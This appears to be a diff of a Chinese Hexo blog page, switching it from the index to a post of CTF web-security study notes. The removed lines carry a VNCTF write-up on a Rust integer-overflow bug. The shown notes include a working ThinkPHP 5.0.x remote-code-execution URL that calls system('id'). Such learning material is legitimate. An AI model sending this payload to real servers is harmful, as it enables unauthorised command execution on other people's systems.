@@ -20,28 +20,36 @@
     var CONFIG = {"hostname":"c1oudflowing.github.io","root":"/blog/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog,from C1oudFLowing">
-<meta property="og:url" content="http://c1oudflowing.github.io/blog/index.html">
+  <meta name="description" content="官方WPHNCTF WEB [ISCTF](D:\文档\CTF\Write Up\ISCTF2022-main\ISCTF2022-WriteUp.md) [Skynico](D:&#x2F;文档&#x2F;CTF&#x2F;Write Up&#x2F;SkyNICO Writeup.pdf) 菜狗杯 RCTF Hgame 西湖论剑  前置八种请求 session 正则表达式 BurpSuite">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web笔记">
+<meta property="og:url" content="http://c1oudflowing.github.io/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Blog,from C1oudFLowing">
+<meta property="og:description" content="官方WPHNCTF WEB [ISCTF](D:\文档\CTF\Write Up\ISCTF2022-main\ISCTF2022-WriteUp.md) [Skynico](D:&#x2F;文档&#x2F;CTF&#x2F;Write Up&#x2F;SkyNICO Writeup.pdf) 菜狗杯 RCTF Hgame 西湖论剑  前置八种请求 session 正则表达式 BurpSuite">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20221207161642898.png">
+<meta property="og:image" content="http://c1oudflowing.github.io/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/image-20221209231042495.png">
+<meta property="article:published_time" content="2023-02-28T08:06:40.000Z">
+<meta property="article:modified_time" content="2023-02-28T08:32:57.196Z">
 <meta property="article:author" content="CloudFlowing">
+<meta property="article:tag" content="学习">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20221207161642898.png">
 
-<link rel="canonical" href="http://c1oudflowing.github.io/blog/">
+<link rel="canonical" href="http://c1oudflowing.github.io/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>Blog,from C1oudFLowing</title>
+  <title>Web笔记 | Blog,from C1oudFLowing</title>
   
 
 
@@ -140,9 +148,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -158,10 +167,9 @@
       <meta itemprop="name" content="Blog,from C1oudFLowing">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Web笔记</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Web笔记
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -185,7 +193,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h1><p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/doxcnfAleQyWvxtaviJQUyfedGd">HNCTF WEB</a></p>
+        <h1 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h1><p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/doxcnfAleQyWvxtaviJQUyfedGd">HNCTF WEB</a></p>
 <p>[ISCTF](D:\文档\CTF\Write Up\ISCTF2022-main\ISCTF2022-WriteUp.md)</p>
 <p>[Skynico](D:&#x2F;文档&#x2F;CTF&#x2F;Write Up&#x2F;SkyNICO Writeup.pdf)</p>
 <p>菜狗杯</p>
@@ -1054,246 +1062,33 @@
 <h1 id="模板漏洞"><a href="#模板漏洞" class="headerlink" title="模板漏洞"></a>模板漏洞</h1><h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/yangbz123/article/details/115329314?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167748807816782425179087%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167748807816782425179087&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115329314-null-null.142%5Ev73%5Einsert_down1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=thinkphp%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">ThinkPHP</a></h2><h3 id="5-0-x"><a href="#5-0-x" class="headerlink" title="5.0.x"></a>5.0.x</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/blog/tags/%E5%AD%A6%E4%B9%A0/" rel="tag"># 学习</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/02/26/VNCTF-GongDe/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/26/VNCTF-GongDe/" class="post-title-link" itemprop="url">VNCTF GongDe</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-02-26 21:55:22 / 修改时间：22:56:15" itemprop="dateCreated datePublished" datetime="2023-02-26T21:55:22+08:00">2023-02-26</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h1><blockquote>
-<p>RUST文件代码审计</p>
-<p>整数溢出</p>
-</blockquote>
-<h2 id="分析代码结构（main-rs）"><a href="#分析代码结构（main-rs）" class="headerlink" title="分析代码结构（main.rs）"></a>分析代码结构（main.rs）</h2><h3 id="初始页面及-每次修改后都要返回此页面查看数值"><a href="#初始页面及-每次修改后都要返回此页面查看数值" class="headerlink" title="初始页面及(每次修改后都要返回此页面查看数值)"></a>初始页面及(每次修改后都要返回此页面查看数值)</h3><p><img src="C:\Users\Asus\Desktop\hexo\source_posts\image-20230226221223336.png" alt="image-20230226221223336"></p>
-<h3 id="此段得知获取flag的条件"><a href="#此段得知获取flag的条件" class="headerlink" title="此段得知获取flag的条件"></a>此段得知获取flag的条件</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">context</span> = Context::<span class="title function_ invoke__">new</span>();</span><br><span class="line"></span><br><span class="line">    context.<span class="title function_ invoke__">insert</span>(<span class="string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="title function_ invoke__">get</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &gt; <span class="number">1_000_000_000</span> &#123;	<span class="comment">//GONGDE大于1_000_000_000即可获取flag</span></span><br><span class="line">        context.<span class="title function_ invoke__">insert</span>(</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            &amp;std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="title function_ invoke__">to_string</span>()),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> tera.<span class="title function_ invoke__">render</span>(<span class="string">&quot;index.html&quot;</span>, &amp;context) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(body) =&gt; <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">body</span>(body)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(err) =&gt; <span class="title function_ invoke__">Err</span>(error::<span class="title function_ invoke__">ErrorInternalServerError</span>(err)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        
 
 
-
-<hr>
-<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">APIResult</span> &#123;</span><br><span class="line">    success: <span class="type">bool</span>,</span><br><span class="line">    message: &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    quantity: <span class="type">i32</span>,<span class="comment">//定义quantity为i32类型的有符号整数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Copy, Clone, Serialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    name: &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>,</span><br><span class="line">    cost: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>定义类及参数</p>
-<hr>
-<h3 id="定义name-选项-及其Cost-花费的功德"><a href="#定义name-选项-及其Cost-花费的功德" class="headerlink" title="定义name(选项)及其Cost(花费的功德)"></a>定义<code>name</code>(选项)及其<code>Cost</code>(花费的功德)</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Cost&quot;</span>,</span><br><span class="line">        cost: <span class="number">10</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Loan&quot;</span>,</span><br><span class="line">        cost: -<span class="number">1_000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;CCCCCost&quot;</span>,</span><br><span class="line">        cost: <span class="number">500</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Donate&quot;</span>,</span><br><span class="line">        cost: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Sleep&quot;</span>,</span><br><span class="line">        cost: <span class="number">0</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h3 id="主要判断部分"><a href="#主要判断部分" class="headerlink" title="主要判断部分"></a>主要判断部分</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[post(<span class="string">&quot;/upgrade&quot;</span>)]</span>		<span class="comment">//此段说明在/upgrade中传参方式为POST</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;	<span class="comment">//从Info中获取参数名</span></span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> body.quantity &lt;= <span class="number">0</span> &#123;		<span class="comment">//禁止传入小于等于0的数</span></span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(payload) = PAYLOADS.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|u| u.name == body.name) &#123;		<span class="comment">//根据传入name的类型进入不同分支</span></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cost</span> = payload.cost;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> || payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            cost *= body.quantity;		<span class="comment">//在 name 参数为 Donate 或Cost 的时候会将原本的功德消耗值乘上我们传入的 </span></span><br><span class="line">        &#125;								<span class="comment">//quantity参数值计算功德消耗</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; cost <span class="keyword">as</span> <span class="type">i32</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">false</span>,</span><br><span class="line">                message: <span class="string">&quot;功德不足&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cost != <span class="number">0</span> &#123;</span><br><span class="line">            GONGDE.<span class="title function_ invoke__">set</span>(GONGDE.<span class="title function_ invoke__">get</span>() - cost <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;小扣一手功德&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;CCCCCost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;功德都快扣没了，怎么睡得着的&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Loan&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;好人有好报&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Sleep&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;这是什么？床，睡一下&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">        success: <span class="literal">false</span>,</span><br><span class="line">        message: <span class="string">&quot;禁止开摆&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>返回均为json页面</li>
-</ul>
-<hr>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
-<li>在 <code>name</code> 参数为 <code>Donate </code>或<code>Cost</code> 的时候会将原本的功德消耗值乘上我们传入的 <code>quantity</code> 参数值计算功德消耗</li>
-<li>但是唯一能使功德增加的 <code>Loan</code> 选项并没有出现在此分支的条件判断中，因此无法直接正向增加功德一步到位。正向的路基本被堵死</li>
-<li>同时我们也注意到 <code>cost</code> 变量为 <code>i32 有符号整数</code>，上限为<strong>2,147,483,647</strong>，当我们要<strong>扣的功德足够大时就会造成溢出，得到一个绝对值非常大的负数</strong>。再加上并没有设置对 <code>quantity </code>参数的限制，办到这一点还是不难的。</li>
-</ul>
-<hr>
-<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20230226224756233.png" alt="image-20230226224756233"></p>
-<ul>
-<li>在upgrade中发出请求使功德扣至溢出</li>
-</ul>
-<p><img src="C:\Users\Asus\Desktop\hexo\source_posts\image-20230226224920856.png" alt="image-20230226224920856"></p>
-<ul>
-<li>返回页面获取flag</li>
-</ul>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/blog/2023/02/26/VNCTF-GongDe/" rel="prev" title="VNCTF GongDe">
+      <i class="fa fa-chevron-left"></i> VNCTF GongDe
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/02/10/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/10/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-10 22:04:25" itemprop="dateCreated datePublished" datetime="2023-02-10T22:04:25+08:00">2023-02-10</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/02/10/test/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/10/test/" class="post-title-link" itemprop="url">test</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-02-10 21:26:41 / 修改时间：22:04:25" itemprop="dateCreated datePublished" datetime="2023-02-10T21:26:41+08:00">2023-02-10</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -1346,6 +1141,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%98%E6%96%B9WP"><span class="nav-number">1.</span> <span class="nav-text">官方WP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">前置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP"><span class="nav-number">2.0.1.</span> <span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E4%B8%8B%E6%95%B0%E5%AD%97%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">弱类型下数字相等绕过方式：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpinfo-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">phpinfo()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.3.</span> <span class="nav-text">system()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">2.0.1.4.</span> <span class="nav-text">变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">2.0.1.4.1.</span> <span class="nav-text">$$</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#extract-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.4.2.</span> <span class="nav-text">extract()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#parse-str-%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.4.3.</span> <span class="nav-text">parse_str()函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E6%B3%95%E4%BC%A0%E5%8F%82"><span class="nav-number">2.0.1.5.</span> <span class="nav-text">非法传参</span></a></li><li class="nav-item 